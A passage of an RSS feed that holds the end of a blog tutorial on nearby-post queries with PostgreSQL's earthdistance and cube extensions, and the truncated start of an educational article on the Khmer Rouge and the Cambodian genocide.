<pre>CREATE EXTENSION IF NOT EXISTS cube;
CREATE EXTENSION IF NOT EXISTS earthdistance;</pre>



<p>After executing those two queries, you should see them under the ‚ÄòExtensions‚Äô tab in DBeaver.</p>



<div><figure><img data-attachment-id="219" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-24-18/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=652%2C190&amp;ssl=1" data-orig-size="652,190" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.24.18" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=300%2C87&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=580%2C169&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2>Finding nearby posts.</h2>



<p>We can now use these built in functions from those extensions to show us the two nearby posts.</p>



<pre>SELECT * FROM post
WHERE 
	earth_box(ll_to_earth(51.5032,-0.1349), 50000) 
	@&gt; ll_to_earth(latitude, longitude);</pre>



<p>The earth_box function takes two parameters, a point (which is returned by the ll_to_earth function) and a value for the size of the bounding box we want which is in metres. </p>



<p>By using the <a aria-label="undefined (opens in a new tab)" href="https://www.postgresql.org/docs/current/functions-geometry.html" target="_blank" rel="noreferrer noopener nofollow">contains?</a> operator (@&gt;) we are saying we only want values in the table in the bounding box generated by the earth_box function.</p>



<p>When executing that query we will see the two posts we were expecting! Try increasing the bounding box range out and you will be able to see the Cambridge post.</p>



<div><figure><img data-attachment-id="223" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-30-11/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=2558%2C1516&amp;ssl=1" data-orig-size="2558,1516" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.30.11" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=300%2C178&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=580%2C344&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>So now we have a working example of how to recreate the YikYak location-based functionality.</p>



<h2>So‚Ä¶how?</h2>



<p>Okay so why did we need those extensions? Can‚Äôt we just take the world, split it into squares and determine which box a latitude and longitude falls into? </p>



<p>Thats what we would <em>like</em> to do ‚Äì but there are complications caused by the fact that the world is a sphere. To find posts ‚Äúin your area‚Äù you are querying to find straight line distances between two points, your lat-long and for each row in the database. In a sphere there are no straight lines. </p>



<p>There is a way to determine the distance between two points known as the <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Great-circle_distance#:~:text=The%20great%2Dcircle%20distance%20or,line%20through%20the%20sphere's%20interior)." target="_blank" rel="noreferrer noopener nofollow">Great-Circle distance</a>. Instead of using straight lines we use circles or curves known as geodesics. Through any two points on a sphere that are not&nbsp;<a href="https://en.wikipedia.org/wiki/Antipodal_point">directly opposite each other</a>, there is a unique great circle. </p>



<p>The earthdistance extension allows us to generate queries using the contains? operator from the cube extension to generate efficient distance lookups between points.</p>



<h2>Conclusion</h2>



<p>One thing to note is that this query will do a sequential scan of the entire table, which can be slow once you get up to thousands of posts. </p>



<p>If you do decide to use this setup in your application you should create an index on the latitude, longitude to dramatically speed up queries. That would look like this.</p>



<pre>CREATE INDEX loc_index ON post USING gist (ll_to_earth(latitude, longitude));</pre>



<p>Postgres will then determine whether it needs to use this index to speed up queries. You can check if the index is being used by using a tool to view the execution plan when you run the query detailed above. If it says SEQ_SCAN it is not using the index. </p>



<p>And we‚Äôre done! If you‚Äôve noticed any mistakes or improvements I can make please drop me an email at adam@adamfallon.com</p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837269</guid>
            <pubDate>Tue, 14 Jul 2020 20:18:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Khmer Rouge: Genocide in the Name of Utopia (2016)]]>
            </title>
            <description>
<![CDATA[
Score 184 | Comments 192 (<a href="https://news.ycombinator.com/item?id=23836985">thread link</a>) | @exolymph
<br/>
July 14, 2020 | https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/ | <a href="https://web.archive.org/web/*/https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<h5><strong>How is history used to support ideology? Is violence by a government against its own civilian population ever justified? Why are certain events given priority over others in history books?</strong></h5>
<h5><strong>This lesson was reported from:</strong></h5>

<h6>Adapted in part from open sources.</h6>

<figure data-shortcode="caption" id="attachment_464" aria-describedby="caption-attachment-464"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg"><img data-attachment-id="464" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/skulls_2584193k/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg" data-orig-size="858,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Evidence for genocide in Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=581&amp;h=362" alt="Evidence for genocide in Cambodia." width="581" height="362" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=579&amp;h=362 579w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=150&amp;h=94 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300&amp;h=187 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=768&amp;h=480 768w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg 858w" sizes="(max-width: 581px) 100vw, 581px"></a><figcaption id="caption-attachment-464">Evidence for genocide in Cambodia.</figcaption></figure>
<p><!--block-->The Khmer Rouge was formed in 1968 as a revolutionary Communist party in Cambodia. It was the <a href="https://en.wikipedia.org/wiki/Ruling_party">ruling party</a> in Cambodia from 1975 to 1979, led by <a href="https://en.wikipedia.org/wiki/Pol_Pot">Pol Pot</a>. <a href="https://en.wikipedia.org/wiki/Democratic_Kampuchea">Democratic Kampuchea</a> was the name of the state as controlled by the government of the Khmer Rouge from 1975 to 1979.</p>
<p><!--block-->The four-year period cost approximately 2 million lives through the combined result of political executions, disease, <a href="https://en.wikipedia.org/wiki/Starvation">starvation</a>, and <a href="https://en.wikipedia.org/wiki/Unfree_labor">forced labor</a>. Due to the large numbers, the deaths during the rule of the Khmer Rouge are commonly known as the Cambodian Holocaust or <a href="https://en.wikipedia.org/wiki/Cambodian_genocide">Cambodian genocide</a>. The Khmer Rouge took power at the end of the <a href="https://en.wikipedia.org/wiki/Cambodian_Civil_War">Cambodian Civil War</a> and were only toppled after the invasion of Cambodia by the neighboring Socialist Republic of <a href="https://en.wikipedia.org/wiki/Vietnam">Vietnam</a> in the <a href="https://en.wikipedia.org/wiki/Cambodian%E2%80%93Vietnamese_War">Cambodian‚ÄìVietnamese War</a>.</p>
<h2>Pol Pot and the Revolution</h2>

<p><!--block-->Saloth Sar was born on 19 May 1925, the eighth of nine children and the second of three sons to Pen Saloth and Sok Nem. The family was living in the small fishing village of <a href="https://en.wikipedia.org/wiki/Prek_Sbauv">Prek Sbauv</a>, <a href="https://en.wikipedia.org/wiki/Kampong_Thom_Province">Kampong Thom Province</a> when Cambodia was still a French colony. Pen Saloth was a rice farmer who owned 12 <a href="https://en.wikipedia.org/wiki/Hectare">hectares</a> of land and several buffaloes; the family was considered moderately wealthy by the standards of the day. Although Pen Saloth‚Äôs family was of <a href="https://en.wikipedia.org/wiki/Chinese_Cambodian">Sino</a>‚Äì<a href="https://en.wikipedia.org/wiki/Khmer_people">Khmer</a> descent and Saloth Sar was named accordingly due to his fair complexion (‚ÄúSar‚Äù means white in Khmer), the family had already assimilated themselves with mainstream Khmer society by the time Sar was born.</p>
<p><!--block-->In 1935, Saloth Sar left Prek Sbauv to attend the √âcole Miche, a Catholic school in <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a>. He lived with his cousin, a woman called Meak, a member of the <a href="https://en.wikipedia.org/wiki/Royal_Ballet_of_Cambodia">Royal Ballet</a>.In 1926, she bore King <a href="https://en.wikipedia.org/wiki/Sisowath_Monivong">Monivong‚Äôs</a> son, HRH Prince Sisowath Kusarak. She was given the official title <em>Khun Preah Moneang Bopha Norleak Meak</em>. Saloth Sar stayed with Meak‚Äôs household until 1942. His sister Roeung was a <a href="https://en.wikipedia.org/wiki/Concubinage">concubine</a> of King Monivong, so through the two women, he often had cause to visit the <a href="https://en.wikipedia.org/wiki/Royal_Palace,_Phnom_Penh">royal palace</a>.&nbsp; In 1947, he gained admission to the exclusive <a href="https://en.wikipedia.org/wiki/Lyc%C3%A9e_Sisowath">Lyc√©e Sisowath</a>, but was unsuccessful in his studies.</p>
<p><!--block-->As a student in Phnom Penh and later in Paris, Saloth was exposed to anti-colonial, revolutionary, and socialist ideas.&nbsp; He became increasingly radical, outraged by French colonialism, the poverty of his nation compared to France itself, and wealth inequality within Cambodia even after French granted the nation independence in the 1950s.</p>
<p><!--block-->Saloth was a founding member of the Khmer Rouge, a party dedicated to socialist revolution in Cambodia.</p>
<div>
<h2>Ideology</h2>
<figure data-shortcode="caption" id="attachment_470" aria-describedby="caption-attachment-470"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg"><img data-attachment-id="470" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/9660abf16bdbccfcaa829a72aa444922/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg" data-orig-size="634,692" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="A female Khmer Rouge fighter or ‚Äòmit naree‚Äô carries an AK-47 assault rifle, a weapon of Communist revolution the world over." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=634" src="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300" alt="A female Khmer Rouge fighter or 'mit naree' carries an AK-47 assault rifle, a weapon of Communist revolution the world over." width="275" height="300" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300 275w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=550&amp;h=600 550w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=137&amp;h=150 137w" sizes="(max-width: 275px) 100vw, 275px"></a><figcaption id="caption-attachment-470">A female Khmer Rouge fighter or ‚Äòmit naree‚Äô carries an AK-47 assault rifle, a weapon of Communist revolution the world over.</figcaption></figure>
<p>The Khmer Rouge‚Äôs ideology combined elements of&nbsp;<a href="https://en.wikipedia.org/wiki/Marxism">Marxism</a>&nbsp;with an extreme version of Khmer nationalism and&nbsp;<a href="https://en.wikipedia.org/wiki/Xenophobia">xenophobia</a>. It combined an idealization of the&nbsp;<a href="https://en.wikipedia.org/wiki/Angkor_Empire">Angkor Empire</a>&nbsp;(802‚Äì1431), with an existential fear for the existence of the Cambodian state, which had historically been liquidated under Vietnamese and Siamese intervention.The spillover of Vietnamese fighters from the&nbsp;<a href="https://en.wikipedia.org/wiki/Vietnam_War">Vietnam War</a>&nbsp;further aggravated anti-Vietnamese feeling. The Khmer Rouge explicitly targeted the Chinese, Vietnamese, and even their partially Khmer offspring for extinction; although the&nbsp;<a href="https://en.wikipedia.org/wiki/Cham_people">Cham Muslims</a>&nbsp;were treated unfavorably, they were encouraged to ‚Äúmix flesh and blood‚Äù, to intermarry and assimilate. Some people with partial Chinese or Vietnamese ancestry were present in the Khmer Rouge leadership; they either were purged or participated in the&nbsp;<a href="https://en.wikipedia.org/wiki/Ethnic_cleansing">ethnic cleansing</a>&nbsp;campaigns.</p>
<p>The Khmer Rouge‚Äôs social policy focused on working towards a purely agrarian society. Pol Pot strongly influenced the propagation of this policy. He was reportedly impressed with how the mountain tribes of Cambodia lived, which the party interpreted as a form of&nbsp;<a href="https://en.wikipedia.org/wiki/Primitive_communism">primitive communism</a>; as a result, those minorities received more lenient and sometimes even more favorable treatment than the urbanized ‚Äú<a href="https://en.wikipedia.org/wiki/Bourgeois">bourgeois</a>‚Äù Chinese and Vietnamese. Pol Pot wanted to remove social institutions and to transform the society into an agrarian one. This was his way of ‚Äú[creating] a complete Communist society without wasting time on the intermediate steps‚Äù as the Khmer Rouge said to&nbsp;<a href="https://en.wikipedia.org/wiki/China">China</a>&nbsp;in 1975.</p>
<h2>Control of the countryside</h2>
<p>The Khmer Rouge advanced during 1973. After they reached the outskirts of Phnom Penh, Sar issued orders during the peak of the <a href="https://en.wikipedia.org/wiki/Wet_season">rainy season</a> that the city be taken. The orders led to futile attacks and wasted lives within the Khmer Rouge army. By the middle of 1973, the Khmer Rouge under Sar controlled almost two-thirds of the country and half the population.</p>
<p>Internationally, Sar and the Khmer Rouge gained the recognition of 63 countries as the true government of Cambodia. A move was made at the UN to give the seat for Cambodia to the Khmer Rouge; they prevailed by three votes.</p>
<div>
<p>The Khmer Rouge took the capital <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a> on 17 April 1975, proclaiming this be Year Zero ‚Äì all culture and traditions within society would be completely destroyed or discarded, and a new revolutionary culture would replace it.</p>
<figure data-shortcode="caption" id="attachment_473" aria-describedby="caption-attachment-473"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg"><img data-attachment-id="473" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/d158d8646827595a49fa281c27071779/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Phnom Penh, January 1st, 1975 in the waning days of the civil war." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383" alt="Phnom Penh, January 1st, 1975 in the waning days of the civil war." width="580" height="383" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383 580w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg 611w" sizes="(max-width: 580px) 100vw, 580px"></a><figcaption id="caption-attachment-473">Phnom Penh, January 1st, 1975 in the waning days of the civil war.</figcaption></figure>
<h2>Societal transformation</h2>
<p>After taking power, the Khmer Rouge leadership renamed the country Democratic Kampuchea. The Khmer Rouge subjected Cambodia to a radical social reform process that was aimed at creating a purely&nbsp;<a href="https://en.wikipedia.org/wiki/Agrarian_socialism">agrarian-based Communist society</a>.&nbsp;The Khmer Rouge forced around three million people from the cities to the countryside to take up work in agriculture. They forced many people out of their homes and ignored many basic human freedoms; they controlled how Cambodians acted, what they wore, to whom they could talk, and many other aspects of their lives.</p>
<dl id="attachment_472">
<dt><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png"><img data-attachment-id="472" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/90631961305feae1ac126f4e2ae87bc7/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png" data-orig-size="1204,1007" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evacuation of Cambodia‚Äôs urban areas occurred on the pretext of a U.S. invasion that never came." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251" alt="The evacuation of Cambodia's urban areas occurred on the pretext of a U.S. invasion that never came." width="300" height="251" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=600&amp;h=502 600w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=150&amp;h=125 150w" sizes="(max-width: 300px) 100vw, 300px"></a></dt>
<dd>The evacuation of Cambodia‚Äôs urban areas occurred on the pretext of a U.S. invasion that never came.</dd>
</dl>
<p>The Khmer Rouge believed that parents were tainted with&nbsp;<a href="https://en.wikipedia.org/wiki/Capitalism">capitalism</a>, so they separated children from their parents, indoctrinated them in&nbsp;<a href="https://en.wikipedia.org/wiki/Communism">communism</a>, and taught them torture methods with animals. Children were a ‚Äúdictatorial instrument of the party‚Äù and were given leadership in torture and executions.</p>
<p>Society was divided into two categories. These were the New People ‚Äì intellectuals, city-dwellers, minority people, and many of their own party members and soldiers who were suspected of being traitors ‚Äì and the Old People ‚Äì those who already lived in the countryside.</p>
<p>The lowest unit of social control, the&nbsp;<em>krom</em>&nbsp;(group), consisted of ten to fifteen nuclear families whose activities were closely supervised by a three-person committee. The committee chairman was selected by the CPK. This grass roots leadership was required to note the social origin of each family under its jurisdiction and to report it to persons higher up in the&nbsp;party hierarchy.</p>
<h2>The New People</h2>
<div>
<figure data-shortcode="caption" id="attachment_475" aria-describedby="caption-attachment-475"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg"><img data-attachment-id="475" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/khmer_rouge_07/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Forced labor camp in Kampong Cham, Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243" alt="Forced labor camp in Kampong Cham, Cambodia." width="368" height="243" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243 368w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg 611w" sizes="(max-width: 368px) 100vw, 368px"></a><figcaption id="caption-attachment-475">Forced labor camp in Kampong Cham, Cambodia.</figcaption></figure>
<p>New People were treated as forced laborers. They were constantly moved, were forced to do the hardest physical labor, and worked in the most inhospitable, fever-ridden parts of the country, such as forests, upland areas, and swamps. ‚ÄúNew People were segregated from Old People, enjoyed little or no privacy, and received the smallest rice rations. When the country experienced <a href="https://en.wikipedia.org/wiki/Famine">food shortages</a> in 1977, the New People suffered the most.</p>
</div>
<p>The medical care available to them was primitive or nonexistent. Families often were separated because people were divided into work brigades according to age and sex and sent to different parts of the country. New People were subjected to unending political indoctrination and could be executed without trial.</p>
<p>One of their mottos in reference to the <a href="https://en.wikipedia.org/wiki/New_People">New People</a> was: ‚ÄúTo keep you is no benefit. To destroy you is no loss.‚Äù</p>
<p>The situation of the Old People under Khmer Rouge rule was more ambiguous. Refugee interviews reveal cases in which villagers were treated as harshly as the New People, enduring forced labor, indoctrination, the separation of children from parents, and executions; however, they were generally allowed to remain in their native villages.</p>
</div>
</div>
<h2>Life Under the Khmer Rouge</h2>
<div>
<p>Once in power, the Khmer Rouge carried out a radical program that included isolating the country from all foreign influences, closing schools, hospitals, and factories, abolishing banking, finance, and currency, outlawing all religions, confiscating all <a href="https://en.wikipedia.org/wiki/Private_property">private property</a> and relocating people from urban areas to <a href="https://en.wikipedia.org/wiki/Collective_farm">collective farms</a> where forced labor was widespread. The purpose of this policy was to turn all Cambodians into Old People through agricultural labor.</p>
<figure data-shortcode="caption" id="attachment_466" aria-describedby="caption-attachment-466"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg"><img data-attachment-id="466" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/8e1cd4dbed4fa55ac88aba90e53ea0e8/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg" data-orig-size="826,779" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evactuation of Phnom Penh, 1975." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283" alt="The evacuation of Phnom Penh, 1975." width="300" height="283" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=600&amp;h=566 600w, https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=150&amp;h=141 150w" sizes="(max-width: 300px) 100vw, 300px"></a><figcaption id="caption-attachment-466">The evacuation of Phnom Penh, 1975.</figcaption></figure>
<p>In Phnom Penh and other cities, the Khmer Rouge told <a href="https://en.wikipedia.org/wiki/Residency_(domicile)">residents</a> that they would be moved only about ‚Äútwo or three kilometers‚Äù outside the city and would return in ‚Äútwo or three days‚Äù. Some witnesses say they were told that the evacuation was because of the ‚Äúthreat of American bombing‚Äù and that they did not have to lock their houses since the Khmer Rouge would ‚Äútake care of everything‚Äù until they returned. People who refused to evacuate would have their homes burned to the ground and would be killed immediately. The evacuees were sent on long marches to the countryside, which killed thousands of children, elderly people, and sick people.These were not the first evacuations of civilian populations by the Khmer Rouge; similar evacuations of populations without possessions had been occurring on a smaller scale since the early 1970s.</p>
<p>The entire population was forced to become farmers in <a href="https://en.m.wikipedia.org/wiki/Labour_camp">labor camps</a>. Cambodians were expected to produce three tons of rice per hectare; before the Khmer Rouge era, the average was only one ton per hectare. The total lack of agricultural knowledge by the former city dwellers made <a href="https://en.m.wikipedia.org/wiki/Famine">famine</a> inevitable. Rural dwellers were often unsympathetic or too frightened to assist them. Such acts ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</a></em></p>]]>
            </description>
            <link>https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836985</guid>
            <pubDate>Tue, 14 Jul 2020 19:57:32 GMT</pubDate>
        </item>
        <item>
            <title>
